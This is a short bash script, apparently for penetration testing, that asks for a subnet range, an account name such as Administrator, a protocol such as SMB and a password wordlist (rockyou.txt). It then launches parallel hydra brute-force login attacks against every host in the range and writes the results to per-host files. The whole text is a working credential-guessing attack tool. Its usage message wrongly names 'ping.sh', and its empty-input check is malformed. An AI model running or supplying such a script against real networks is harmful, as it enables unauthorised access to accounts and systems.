echo "Enter Subnet Range eg 10.1.1"
read varIP

echo "Enter First IP"
read var1

echo "Enter Last IP"
read var2

echo "Enter Protocol to attack eg smb"
read varPro

echo "Enter name of account eg Administrator"
read varAcc

echo "Enter path to Password file"
echo "Default PW is /root/Desktop/PW/rockyou.txt"
read varPass
#varPass = "/root/Desktop/PW/rockyou.txt"


if ["$varIP" = ""]
then 
echo "usage ./ping.sh 10.1.1.0"
echo "example....."
else
for x in `seq $var1 $var2` ; do
hydra -l $varAcc -P $varPass $varIP.$x $varPro -o /root/Desktop/PW/Hydra/out/$varIP.$x-out.txt &
done
fi
